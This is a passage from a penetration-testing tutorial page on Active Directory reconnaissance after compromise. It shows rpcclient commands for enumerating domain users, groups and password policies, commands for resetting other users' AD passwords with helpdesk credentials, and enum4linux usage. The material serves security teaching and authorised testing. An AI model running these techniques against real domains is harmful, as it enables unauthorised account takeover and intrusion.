

<!doctype html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><script type="text/javascript">

      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-92365403-1']);
      _gaq.push(['_trackPageview']);

      (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
      })();
    </script>
    <title>Infrastructure PenTest Series : Part 3 - Exploitation &#8212; tech.bitvijays.com</title>
    <link rel="stylesheet" href="_static/bizstyle.css" type="text/css" />
    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    './',
        VERSION:     '0.1',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true,
        SOURCELINK_SUFFIX: '.txt'
      };
    </script>
    <script type="text/javascript" src="_static/jquery.js"></script>
    <script type="text/javascript" src="_static/underscore.js"></script>
    <script type="text/javascript" src="_static/doctools.js"></script>
    <script type="text/javascript" src="_static/disqus.js"></script>
    <script type="text/javascript" src="_static/bizstyle.js"></script>
    <link rel="search" title="Search" href="search.html" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!--[if lt IE 9]>
    <script type="text/javascript" src="_static/css3-mediaqueries.js"></script>
    <![endif]-->
  </head>
  <body>
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
  <h3><a href="index.html">Table Of Contents</a></h3>
  <ul>
<li><a class="reference internal" href="#">Infrastructure PenTest Series : Part 3 - Exploitation</a><ul>
<li><a class="reference internal" href="#active-directory-reconnaissance">Active Directory Reconnaissance</a><ul>
<li><a class="reference internal" href="#rpclient">rpclient</a><ul>
<li><a class="reference internal" href="#connection">Connection</a></li>
<li><a class="reference internal" href="#version-of-the-target-windows-machine">Version of the target Windows machine</a></li>
<li><a class="reference internal" href="#enum-commands">Enum commands</a></li>
<li><a class="reference internal" href="#current-domain">Current domain</a></li>
<li><a class="reference internal" href="#enum-domain-info">Enum Domain info</a></li>
<li><a class="reference internal" href="#enum-domain-users">Enum Domain users</a></li>
<li><a class="reference internal" href="#enum-domain-groups">Enum Domain groups</a></li>
<li><a class="reference internal" href="#enum-group-information-and-group-membership">Enum Group Information and Group Membership</a></li>
<li><a class="reference internal" href="#enumerate-specific-user-computer-information-by-rid">Enumerate specific User/ computer information by RID</a></li>
<li><a class="reference internal" href="#domain-password-policy">Domain Password Policy</a></li>
<li><a class="reference internal" href="#user-password-policies">User password policies</a></li>
<li><a class="reference internal" href="#local-users">Local Users</a></li>
<li><a class="reference internal" href="#reset-ad-user-password">Reset AD user password</a></li>
</ul>
</li>
<li><a class="reference internal" href="#enum4linux">Enum4linux</a><ul>
<li><a class="reference internal" href="#usage">Usage</a></li>
<li><a class="reference internal" href="#example">Example</a></li>
</ul>
</li>
<li><a class="reference internal" href="#active-directory-explorer-adexplorer">Active Directory Explorer (ADExplorer)</a></li>
<li><a class="reference internal" href="#jxplorer">JXplorer</a></li>
<li><a class="reference internal" href="#remote-server-administration-tools">Remote Server Administration Tools</a></li>
<li><a class="reference internal" href="#nltest">nltest</a><ul>
<li><a class="reference internal" href="#id5">Usage</a></li>
<li><a class="reference internal" href="#verify-domain-controllers-in-a-domain">Verify domain controllers in a domain</a></li>
<li><a class="reference internal" href="#advanced-information-about-users">Advanced information about users</a></li>
<li><a class="reference internal" href="#determine-the-pdc-emulator-for-a-domain">Determine the PDC emulator for a domain</a></li>
<li><a class="reference internal" href="#show-trust-relationships-for-a-domain">Show trust relationships for a domain</a></li>
</ul>
</li>
<li><a class="reference internal" href="#netdom">netdom</a><ul>
<li><a class="reference internal" href="#id6">Usage</a></li>
<li><a class="reference internal" href="#dc">DC</a></li>
<li><a class="reference internal" href="#pdc">PDC</a></li>
<li><a class="reference internal" href="#fsmo">FSMO</a></li>
<li><a class="reference internal" href="#trust">TRUST</a></li>
<li><a class="reference internal" href="#ou">OU</a></li>
<li><a class="reference internal" href="#server-workstation">SERVER/ WORKSTATION</a></li>
</ul>
</li>
<li><a class="reference internal" href="#microsoft-active-directory-topology-diagrammer">Microsoft Active Directory Topology Diagrammer</a></li>
<li><a class="reference internal" href="#ad-reconnaissance-with-powershell">AD Reconnaissance with PowerShell</a><ul>
<li><a class="reference internal" href="#forest-information">Forest Information</a></li>
<li><a class="reference internal" href="#domain-information">Domain Information</a></li>
<li><a class="reference internal" href="#forest-trusts">Forest Trusts</a></li>
<li><a class="reference internal" href="#domain-trusts">Domain Trusts</a></li>
<li><a class="reference internal" href="#forest-global-catalogs">Forest Global Catalogs</a></li>
<li><a class="reference internal" href="#enterprise-services-without-scanning-of-network">Enterprise Services without scanning of Network</a></li>
<li><a class="reference internal" href="#spn-scanning">SPN-Scanning</a></li>
<li><a class="reference internal" href="#spn-scanning-using-powershell">SPN Scanning using Powershell</a></li>
<li><a class="reference internal" href="#find-all-registered-sql-servers-dcom-dnscache-etc">Find all registered SQL Servers, Dcom, dnscache etc.</a></li>
<li><a class="reference internal" href="#discovering-the-service-accounts">Discovering the Service Accounts</a></li>
<li><a class="reference internal" href="#discovering-the-computers-and-domain-controllers-without-scanning-the-network">Discovering the Computers and Domain Controllers without scanning the network</a></li>
<li><a class="reference internal" href="#identifying-the-admin-accounts">Identifying the Admin Accounts</a></li>
<li><a class="reference internal" href="#finding-the-admin-groups">Finding the Admin Groups</a></li>
<li><a class="reference internal" href="#id8">Domain Password Policy</a></li>
<li><a class="reference internal" href="#identifying-the-groups-with-local-admin-rights-to-windows-machines">Identifying the Groups with Local Admin Rights to windows machines</a></li>
</ul>
</li>
<li><a class="reference internal" href="#powershell-adsisearcher-type-accelerator">PowerShell [adsiSearcher] Type Accelerator</a><ul>
<li><a class="reference internal" href="#define-username-password-domain-etc">Define username, password, Domain, etc.</a></li>
<li><a class="reference internal" href="#initialize-the-connection">Initialize the connection</a></li>
<li><a class="reference internal" href="#finding-the-domain-name">Finding the Domain Name</a></li>
<li><a class="reference internal" href="#finding-the-computers">Finding the Computers</a></li>
<li><a class="reference internal" href="#finding-the-users">Finding the Users:</a></li>
<li><a class="reference internal" href="#properties-of-the-object">Properties of the object</a></li>
</ul>
</li>
<li><a class="reference internal" href="#get-sessions-of-remote-machines">Get sessions of remote machines</a><ul>
<li><a class="reference internal" href="#powerview-get-netsession">Powerview Get-NetSession</a></li>
<li><a class="reference internal" href="#net-session">net session</a></li>
<li><a class="reference internal" href="#wmi">WMI</a></li>
</ul>
</li>
<li><a class="reference internal" href="#view-users-in-domain-workgroup">View users in Domain / Workgroup</a><ul>
<li><a class="reference internal" href="#powerview-get-netuser">Powerview Get-NetUser</a></li>
<li><a class="reference internal" href="#net-user-domain">net user /domain</a></li>
<li><a class="reference internal" href="#id9">WMI</a></li>
</ul>
</li>
<li><a class="reference internal" href="#view-machines-in-domain-workgroup">View machines in Domain/ Workgroup</a><ul>
<li><a class="reference internal" href="#powerview-get-netcomputers">Powerview Get-NetComputers</a></li>
<li><a class="reference internal" href="#net-view-domain">net view /domain</a></li>
<li><a class="reference internal" href="#view-machines-affected-by-gpp-vulnerability">View machines affected by GPP vulnerability</a></li>
</ul>
</li>
<li><a class="reference internal" href="#view-group-in-domain-workgroup">View group in Domain / Workgroup</a><ul>
<li><a class="reference internal" href="#powerview-get-netgroupmember">Powerview Get-NetGroupMember</a></li>
<li><a class="reference internal" href="#net-group-domain">Net group / domain</a></li>
<li><a class="reference internal" href="#windows-resource-kit-local-global-executable">Windows Resource Kit Local/ Global executable</a></li>
<li><a class="reference internal" href="#bloodhound-group-memberships">BloodHound Group Memberships</a></li>
<li><a class="reference internal" href="#wmi-user-groups">WMI user groups</a></li>
</ul>
</li>
<li><a class="reference internal" href="#hunting-for-a-particular-user">Hunting for a particular User?</a><ul>
<li><a class="reference internal" href="#powerview-invoke-userhunter">Powerview Invoke-UserHunter</a></li>
<li><a class="reference internal" href="#bloodhound-users-sessions">BloodHound users_sessions</a></li>
<li><a class="reference internal" href="#eventlog-ad">EventLog AD?</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#remote-code-execution-methods">Remote Code Execution Methods</a><ul>
<li><a class="reference internal" href="#winexe">Winexe</a><ul>
<li><a class="reference internal" href="#linux-binary-pth-winexe">Linux Binary pth-winexe</a></li>
<li><a class="reference internal" href="#windows-binary-win-exe">Windows Binary win-exe</a></li>
</ul>
</li>
<li><a class="reference internal" href="#crackmapexec">crackmapexec</a><ul>
<li><a class="reference internal" href="#id13">Usage</a></li>
<li><a class="reference internal" href="#modules">Modules</a></li>
</ul>
</li>
<li><a class="reference internal" href="#smbmap">Smbmap</a></li>
<li><a class="reference internal" href="#impacket-psexec-smbexe-wmiexec">Impacket psexec/ smbexe/ wmiexec</a><ul>
<li><a class="reference internal" href="#impacket-psexec">Impacket psexec</a></li>
<li><a class="reference internal" href="#impacket-smbexec">Impacket smbexec</a></li>
<li><a class="reference internal" href="#impacket-wmiexec">Impacket wmiexec</a></li>
</ul>
</li>
<li><a class="reference internal" href="#metasploit-psexec">Metasploit psexec</a><ul>
<li><a class="reference internal" href="#target-2-native-upload">Target 2: Native upload</a></li>
<li><a class="reference internal" href="#target-1-powershell">Target 1, powershell</a></li>
<li><a class="reference internal" href="#target-3-mof-upload">Target 3: MOF Upload</a></li>
<li><a class="reference internal" href="#working-of-msf-psexec-native-upload">Working of MSF PSexec - Native Upload</a></li>
<li><a class="reference internal" href="#working-of-msf-psexec-powershell">Working of MSF PSExec - Powershell</a></li>
</ul>
</li>
<li><a class="reference internal" href="#sysinternals-psexec">Sysinternals psexec</a><ul>
<li><a class="reference internal" href="#working-of-microsoft-psexec">Working of Microsoft PSExec</a></li>
<li><a class="reference internal" href="#sysinternal-psexec-with-hashes">Sysinternal PSExec with hashes</a></li>
</ul>
</li>
<li><a class="reference internal" href="#task-scheduler">Task Scheduler</a><ul>
<li><a class="reference internal" href="#examples">Examples</a></li>
</ul>
</li>
<li><a class="reference internal" href="#scheduled-tasks">Scheduled Tasks</a><ul>
<li><a class="reference internal" href="#id16">Examples</a></li>
</ul>
</li>
<li><a class="reference internal" href="#service-controller-sc">Service Controller (SC)</a><ul>
<li><a class="reference internal" href="#create-a-new-service">Create a new service</a></li>
<li><a class="reference internal" href="#start-the-service">Start the service</a></li>
<li><a class="reference internal" href="#delete-the-service">Delete the service</a></li>
</ul>
</li>
<li><a class="reference internal" href="#remote-registry">Remote Registry</a><ul>
<li><a class="reference internal" href="#add-an-entry">Add an entry</a></li>
<li><a class="reference internal" href="#query-the-remote-registry">Query the remote registry</a></li>
<li><a class="reference internal" href="#delete-the-remote-registry">Delete the remote registry</a></li>
</ul>
</li>
<li><a class="reference internal" href="#remote-file-access">Remote File Access</a><ul>
<li><a class="reference internal" href="#id17">Example</a></li>
</ul>
</li>
<li><a class="reference internal" href="#winrm">WinRM</a><ul>
<li><a class="reference internal" href="#enabling-ps-remoting">Enabling PS-Remoting</a></li>
<li><a class="reference internal" href="#testing-the-winrm-connection">Testing the WinRM Connection</a></li>
<li><a class="reference internal" href="#adding-trusted-host-in-winrm">Adding Trusted Host in WinRM</a></li>
<li><a class="reference internal" href="#powershell-invoke-command">PowerShell Invoke-Command</a></li>
<li><a class="reference internal" href="#interactive-powershell-session">Interactive PowerShell session</a></li>
<li><a class="reference internal" href="#disable-powershell-remoting">Disable Powershell Remoting</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id18">WMI</a><ul>
<li><a class="reference internal" href="#local-code-execution">Local code execution</a></li>
<li><a class="reference internal" href="#remote-code-execution">Remote code execution</a></li>
</ul>
</li>
<li><a class="reference internal" href="#dcom">DCOM</a><ul>
<li><a class="reference internal" href="#dcom-applications-via-mmc-application-class-mmc20-application">DCOM applications via MMC Application Class (MMC20.Application)</a></li>
<li><a class="reference internal" href="#dcom-via-shellexecute">DCOM via ShellExecute</a></li>
<li><a class="reference internal" href="#dcom-via-shellbrowserwindow">DCOM via ShellBrowserWindow</a></li>
</ul>
</li>
<li><a class="reference internal" href="#mimikatz-pth-ptt">Mimikatz PTH/ PTT</a><ul>
<li><a class="reference internal" href="#pass-the-hash">Pass the Hash</a></li>
<li><a class="reference internal" href="#pass-the-ticket">Pass the ticket</a></li>
</ul>
</li>
<li><a class="reference internal" href="#xfreerdp-remote-desktop">xfreerdp/ Remote Desktop</a><ul>
<li><a class="reference internal" href="#rdesktop">rdesktop</a></li>
<li><a class="reference internal" href="#pass-the-hash-with-remote-desktop">Pass the Hash with Remote Desktop</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#useful-stuff">Useful Stuff</a><ul>
<li><a class="reference internal" href="#add-remove-a-local-user">Add/ remove/ a local user</a></li>
<li><a class="reference internal" href="#add-a-domain-user">Add a domain user</a></li>
<li><a class="reference internal" href="#add-remove-a-local-user-to-administrator-group">Add / remove a local user to administrator group</a><ul>
<li><a class="reference internal" href="#change-local-user-password">Change local user password</a></li>
</ul>
</li>
<li><a class="reference internal" href="#accessing-remote-machines">Accessing Remote machines</a><ul>
<li><a class="reference internal" href="#windows">Windows</a></li>
<li><a class="reference internal" href="#linux">Linux</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#appendix-i-interesting-stories">Appendix-I : Interesting Stories</a><ul>
<li><a class="reference internal" href="#targeting-domain-administrator">Targeting Domain Administrator!</a></li>
<li><a class="reference internal" href="#others">Others</a><ul>
<li><a class="reference internal" href="#smbrelay">SMBRelay</a></li>
<li><a class="reference internal" href="#windows-privilege-escalation">Windows Privilege Escalation</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#changelog">Changelog</a></li>
</ul>
</li>
</ul>

  <h3>This Page</h3>
  <ul class="this-page-menu">
    <li><a href="_sources/LFF-IPS-P3-Exploitation.rst.txt"
           rel="nofollow">Show Source</a></li>
    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/blob/master/docs/LFF-IPS-P3-Exploitation.rst"
           rel="nofollow">Show on GitHub</a></li>
    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/edit/master/docs/LFF-IPS-P3-Exploitation.rst"
           rel="nofollow">Edit on GitHub</a></li>
  </ul>
<div id="searchbox" style="display: none" role="search">
  <h3>Quick search</h3>
    <form class="search" action="search.html" method="get">
      <div><input type="text" name="q" /></div>
      <div><input type="submit" value="Go" /></div>
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
        </div>
      </div>

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body" role="main">
            
  <div class="section" id="infrastructure-pentest-series-part-3-exploitation">
<h1>Infrastructure PenTest Series : Part 3 - Exploitation<a class="headerlink" href="#infrastructure-pentest-series-part-3-exploitation" title="Permalink to this headline">¶</a></h1>
<p>After <strong>vulnerability analysis</strong> probably, we would have compromised a machine to have domain user credentials or administrative credentials. This blog presents information about</p>
<ul class="simple">
<li><a class="reference internal" href="#active-directory-reconnaissance"><span class="std std-ref">Active Directory Reconnaissance</span></a> with Domain User rights. Once, we have access to <strong>credentials of a domain user of windows domain</strong>, we can utilize the credentials to do windows <strong>active directory enumeration</strong> such as figuring out the domain controllers, users, machines, trust etc. This post looks into the various methods which are available to do the enumeration such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Directory Topology Diagrammer, reconnaissance using powershell etc.</li>
<li><a class="reference internal" href="#remote-code-execution-methods"><span class="std std-ref">Remote Code Execution Methods</span></a> : Once we have <strong>administrative credentials</strong> there are multiple ways to get a <strong>execute remote commands</strong> on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, scheduled tasks, service controller (sc), remote registry, WinRM, WMI, DCOM, Mimikatz Pass the hash/ Pass the ticket, remote desktop etc. We have a look over all the methods with possible examples.</li>
<li><a class="reference internal" href="#useful-stuff"><span class="std std-ref">Useful Stuff</span></a> : Also, we would have a quick look how to add/ remove/ a local/ domain user, add/ remove a local user to administrator group, accessing remote windows machines from windows/ linux.</li>
<li><a class="reference internal" href="#appendix-i-interesting-stories"><span class="std std-ref">Appendix-I : Interesting Stories</span></a> : Presented the links of interesting blogs which might be helpful in exploitation such as blogs targeting Domain Administrator, etc.</li>
</ul>
<p>Did we miss something? Please send us a pull request and we will add it.</p>
<div class="section" id="active-directory-reconnaissance">
<span id="id1"></span><h2>Active Directory Reconnaissance<a class="headerlink" href="#active-directory-reconnaissance" title="Permalink to this headline">¶</a></h2>
<div class="section" id="rpclient">
<h3>rpclient<a class="headerlink" href="#rpclient" title="Permalink to this headline">¶</a></h3>
<p>eskoudis presents great amount of information at <a class="reference external" href="https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions">Plundering Windows Account Infor via Authenticated SMB Session</a>.  carnal0wnage have written <a class="reference external" href="http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html">Enumerating user accounts on linux and OSX</a> and BlackHills have written <a class="reference external" href="http://www.blackhillsinfosec.com/?p=4645">Password Spraying and Other Fun with RPC Client</a> Most of the stuff has been taken from the above three.</p>
<p>The below commands tell how to figure out</p>
<div class="section" id="connection">
<h4>Connection<a class="headerlink" href="#connection" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient -U xxxxs.hxxxx.net/mlxxxxh 10.0.65.103
</pre></div>
</div>
</div>
<div class="section" id="version-of-the-target-windows-machine">
<h4>Version of the target Windows machine<a class="headerlink" href="#version-of-the-target-windows-machine" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; srvinfo
10.0.65.103    Wk Sv BDC Tim NT
platform_id     :       500
os version      :       6.3
server type     :       0x801033
</pre></div>
</div>
</div>
<div class="section" id="enum-commands">
<h4>Enum commands<a class="headerlink" href="#enum-commands" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; enum

enumalsgroups  enumdomains    enumdrivers    enumkey     enumprivs
enumdata       enumdomgroups  enumforms      enumports   enumtrust
enumdataex     enumdomusers   enumjobs       enumprinter
</pre></div>
</div>
</div>
<div class="section" id="current-domain">
<h4>Current domain<a class="headerlink" href="#current-domain" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>enumdomains
name:[xxxx] idx:[0x0]
name:[Builtin] idx:[0x0]
</pre></div>
</div>
</div>
<div class="section" id="enum-domain-info">
<h4>Enum Domain info<a class="headerlink" href="#enum-domain-info" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; querydominfo
Domain               :  xxxx
Server               :  HMC_PDC-TEMP
Comment              :
Total Users          :  9043
Total Groups         :  0
Total Aliases        :  616
Sequence No          :  1
Force Logoff         : -1
Domain Server State  :  0x1
Server Role          :  ROLE_DOMAIN_BDC
Unknown 3           :    0x1
</pre></div>
</div>
</div>
<div class="section" id="enum-domain-users">
<h4>Enum Domain users<a class="headerlink" href="#enum-domain-users" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; enumdomusers
user:[administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[_STANDARD] rid:[0x3ee]
user:[Install] rid:[0x3fa]
user:[sko] rid:[0x43a]
user:[cap] rid:[0x589]
user:[zentrale] rid:[0x67f]
user:[dbserver] rid:[0x7d9]
user:[JVOO] rid:[0x7fa]
user:[Standard HMC User Te] rid:[0x8a0]
user:[event] rid:[0x8d5]
user:[remote] rid:[0x9ea]
user:[pda-vis1] rid:[0xb65]
user:[TestUser] rid:[0xc46]
user:[oeinstall] rid:[0x1133]
user:[repro] rid:[0x13c3]
</pre></div>
</div>
</div>
<div class="section" id="enum-domain-groups">
<h4>Enum Domain groups<a class="headerlink" href="#enum-domain-groups" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[xxxx Users] rid:[0x4d8]
group:[IC Members] rid:[0x50d]
group:[Event Management] rid:[0x8d7]
group:[SMSInternalCliGrp] rid:[0x9f5]
group:[IT Support] rid:[0x105b]
</pre></div>
</div>
</div>
<div class="section" id="enum-group-information-and-group-membership">
<h4>Enum Group Information and Group Membership<a class="headerlink" href="#enum-group-information-and-group-membership" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; querygroup 0x200
Group Name:     Domain Admins
Description:    Designated administrators of the domain
Group Attribute:7
Num Members:16
</pre></div>
</div>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; querygroupmem 0x200
rid:[0x2227] attr:[0x7]
rid:[0x3601] attr:[0x7]
rid:[0x36aa] attr:[0x7]
rid:[0x36e0] attr:[0x7]
rid:[0x3c23] attr:[0x7]
rid:[0x5528] attr:[0x7]
rid:[0x1f4]  attr:[0x7]
rid:[0x363b] attr:[0x7]
rid:[0x573e] attr:[0x7]
rid:[0x56bc] attr:[0x7]
rid:[0x5e5e] attr:[0x7]
rid:[0x7fe1] attr:[0x7]
rid:[0x86d9] attr:[0x7]
rid:[0x9367] attr:[0x7]
rid:[0x829c] attr:[0x7]
rid:[0xa26e] attr:[0x7]
</pre></div>
</div>
</div>
<div class="section" id="enumerate-specific-user-computer-information-by-rid">
<h4>Enumerate specific User/ computer information by RID<a class="headerlink" href="#enumerate-specific-user-computer-information-by-rid" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; queryuser 0x3601
User Name   :   dummy_s
Full Name   :   Dummy User
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   E 5.5.2008 Admin
Workstations:
Comment     :
Logon Time               :      Tue, 24 Jan 2017 19:28:14 IST
Logoff Time              :      Thu, 01 Jan 1970 05:30:00 IST
Kickoff Time             :      Thu, 14 Sep 30828 08:18:05 IST
Password last set Time   :      Fri, 21 Nov 2008 02:34:34 IST
Password can change Time :      Fri, 21 Nov 2008 02:34:34 IST
Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST
</pre></div>
</div>
</div>
<div class="section" id="domain-password-policy">
<h4>Domain Password Policy<a class="headerlink" href="#domain-password-policy" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; getdompwinfo
min_password_length: 8
password_properties: 0x00000000
</pre></div>
</div>
</div>
<div class="section" id="user-password-policies">
<h4>User password policies<a class="headerlink" href="#user-password-policies" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; getusrdompwinfo 0x3601
min_password_length: 8
&amp;info.password_properties: 0x433e6584 (1128162692)
0: DOMAIN_PASSWORD_COMPLEX
0: DOMAIN_PASSWORD_NO_ANON_CHANGE
1: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
0: DOMAIN_PASSWORD_STORE_CLEARTEXT
0: DOMAIN_REFUSE_PASSWORD_CHANGE
</pre></div>
</div>
</div>
<div class="section" id="local-users">
<h4>Local Users<a class="headerlink" href="#local-users" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>lsaenumsid
S-1-5-21-1971769256-327852233-3012798916-1014 Example\ftp_user (1)
S-1-5-21-1971769256-327852233-3012798916-1000 Example\example_user (1)
</pre></div>
</div>
<div class="highlight-None"><div class="highlight"><pre><span></span>lookupsid S-1-5-21-1971769256-327852233-3012798916-1014
S-1-5-21-1971769256-327852233-3012798916-1014 Example\ftp_user (1)
</pre></div>
</div>
</div>
<div class="section" id="reset-ad-user-password">
<h4>Reset AD user password<a class="headerlink" href="#reset-ad-user-password" title="Permalink to this headline">¶</a></h4>
<p>As Mubix explained in <a class="reference external" href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">Reset AD User Password with Linux</a>. Often we have the credentials of limited administrative accounts such as IT or helpdesk. Sometimes, These accounts have an ability reset the password. This can be achieved in by using rpcclient in linux box provided smbclient and pass-the-hash package should be installed.</p>
<p>setuserinfo2 command can be used in order to change the password.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; setuserinfo2
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER
</pre></div>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">we won’t be able to change the password of users with AdminCount = 1 (Domain Admins and other higher privileged accounts).</p>
</div>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; setuserinfo2 ima-domainadmin 23 &#39;ASDqwe123&#39;
result: NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
rpcclient $&gt;
</pre></div>
</div>
<p>Users having alternate admin accounts can be easily targeted.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>rpcclient $&gt; setuserinfo2 adminuser 23 &#39;ASDqwe123&#39;
rpcclient $&gt;
</pre></div>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">The number 23 came from <a class="reference external" href="https://msdn.microsoft.com/en-us/library/cc245617.aspx">MSDN article USER_INFORMATION_CLASS</a>.  The SAMPR_USER_INTERNAL4_INFORMATION structure holds all attributes of a user, along with an encrypted password.</p>
</div>
<p>This can be done using the net command as well but we need to install the samba-common-bin in our machine.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>root@kali:~# net rpc password adminuser -U helpdesk -S 192.168.80.10
Enter new password for adminuser:
Enter helpdesk&#39;s password:
root@kali:~#
</pre></div>
</div>
</div>
</div>
<div class="section" id="enum4linux">
<h3>Enum4linux<a class="headerlink" href="#enum4linux" title="Permalink to this headline">¶</a></h3>
<p>Simple wrapper around the tools in the samba package to provide similar functionality to enum.exe (formerly from www.bindview.com).</p>
<div class="section" id="usage">
<h4>Usage<a class="headerlink" href="#usage" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>Usage: ./enum4linux.pl [options] ip

Options are (like &quot;enum&quot;):
    -U        get userlist
    -M        get machine list*
    -S        get sharelist
    -P        get password policy information
    -G        get group and member list
    -d        be detailed, applies to -U and -S
    -u user   specify username to use (default &quot;&quot;)
    -p pass   specify password to use (default &quot;&quot;)


Additional options:
   -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
             This option is enabled if you don&#39;t provide any other options.
   -h        Display this help message and exit
   -r        enumerate users via RID cycling
   -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
   -K n      Keep searching RIDs until n consecutive RIDs don&#39;t correspond to a username.  Implies RID range ends at 999999. Useful against DCs.
   -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
   -s file   brute force guessing for share names
   -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
             Used to get sid with &quot;lookupsid known_username&quot;
             Use commas to try several users: &quot;-k admin,user1,user2&quot;
   -o        Get OS information
   -i        Get printer information
   -w wrkg   Specify workgroup manually (usually found automatically)
   -n        Do an nmblookup (similar to nbtstat)
   -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)
</pre></div>
</div>
</div>
<div class="section" id="example">
<h4>Example<a class="headerlink" href="#example" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>enum4linux -P -d xxxx.abcxxx.net -u mluxxxx -p threxxxx 10.0.65.103
</pre></div>
</div>
</div>
</div>
<div class="section" id="active-directory-explorer-adexplorer">
<h3>Active Directory Explorer (ADExplorer)<a class="headerlink" href="#active-directory-explorer-adexplorer" title="Permalink to this headline">¶</a></h3>
<p>As per the TechNet article <a class="reference external" href="https://technet.microsoft.com/en-us/sysinternals/adexplorer.aspx">Active Directory Explorer (AD Explorer)</a> is an advanced Active Directory (AD) viewer and editor. We can use AD Explorer to easily navigate an AD database, define favorite locations, view object properties and attributes without having to open dialog boxes, edit permissions, view an object’s schema, and execute sophisticated searches that you can save and re-execute.</p>
<p><a class="reference external" href="https://www.blackhillsinfosec.com/?team=sally-vandeven">Sally Vandeven</a> has written a brilliant article on <a class="reference external" href="https://www.blackhillsinfosec.com/?p=5938">Domain Goodness – How I Learned to LOVE AD Explorer</a> Must read!</p>
</div>
<div class="section" id="jxplorer">
<h3>JXplorer<a class="headerlink" href="#jxplorer" title="Permalink to this headline">¶</a></h3>
